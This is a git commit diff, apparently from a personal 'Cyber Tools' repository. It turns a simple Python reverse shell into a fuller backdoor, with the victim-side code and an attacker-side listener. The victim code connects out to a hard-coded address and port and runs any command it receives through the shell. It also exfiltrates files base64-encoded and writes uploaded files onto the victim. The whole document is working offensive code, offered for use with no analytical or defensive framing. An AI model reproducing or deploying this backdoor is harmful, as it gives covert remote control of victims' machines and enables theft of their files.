f14b8669e88caeb3bbac335514b4262add65ec5e
Kishore2071 <kishorekumarsaran2001@gmail.com>
2024-03-19 12:19:28 +0530

    Backdoor implemented

--- Cyber Tools/backdoor/backdoor.py
+++ Cyber Tools/backdoor/backdoor.py
@@ -1,17 +1,58 @@
-import socket,subprocess
+import socket,subprocess,json,os,base64
 
 
-connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-connection.connect(("192.168.1.11",4444))
+# Victim - Victim Machine
 
-def execute_command(command):
-    return subprocess.check_output(command,shell=True)
 
-connection.send("\nSend From Windows\n")
 
-while True:
-    command = connection.recv(1024)
-    command_result = execute_command(command)
-    connection.send(command_result)
+class Backdoor:
+    def __init__(self,ip,port):
+        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.connection.connect((ip,port))
+        
+    def execute_command(self,command):
+        return subprocess.check_output(command,shell=True)  
+        
+    def box_send(self,data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+        
+    def change_directory(self,path):
+        os.chdir(path)
+        return "[+] Changing Directory To " + path
 
-connection.close()
+    def box_receive(self):
+        json_data = self.connection.recv(1024)
+        return json.loads(json_data)
+
+    def read_file(self,path):
+        with open(path,"rb") as file:
+            return base64.b64encode(file.read())
+
+    def write_file(self,file_name,content):
+        with open(file_name,"wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Download sucessfully"
+
+    def run(self):
+        while True:
+            command = self.box_receive()
+            try:
+                if command[0] == "exit":
+                    self.connection.close()
+                    exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_directory(command[1])
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1])
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1],command[2])
+                else:
+                    command_result = self.execute_command(command)
+            except Exception:
+                command_result = "[+] Error While Running the command"
+            self.box_send(command_result)
+
+
+backdoor = Backdoor("192.168.1.11",4444)
+backdoor.run()
--- Cyber Tools/backdoor/listener.py
+++ Cyber Tools/backdoor/listener.py
@@ -1,4 +1,9 @@
-import socket
+import socket,json,base64
+
+
+# Kali - Attacker Machine
+
+
 
 class Listener:
     
@@ -11,14 +16,49 @@ class Listener:
         self.connection,address = listener.accept()
         print("Got Connection from " + str(address))
         
+    def box_send(self,data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def box_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + str(self.connection.recv(1024))
+                return json.loads(json_data)
+            except ValueError:
+                continue
+        
     def execute(self,command):
-        self.connection.send(command)
-        return self.connection.recv(1024)
+        self.box_send(command)
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
+        return self.box_receive()
+    
+    def write_file(self,file_name,content):
+        with open(file_name,"wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Download sucessfully"
+        
+    def read_file(self,file_name):
+        with open(file_name,"rb") as file:
+            return base64.b64encode(file.read())
+
 
     def run(self):
         while True:
             command = input(">> ")
-            response = self.execute(command)
+            command  = command.split(" ")
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
+                response = self.execute(command)
+                if command[0] == "download":
+                    response = self.write_file(command[1],response)
+            except Exception:
+                response = "[+] Error While Running the command"
             print(response)
             
 listener1 = Listener("192.168.1.11",4444)
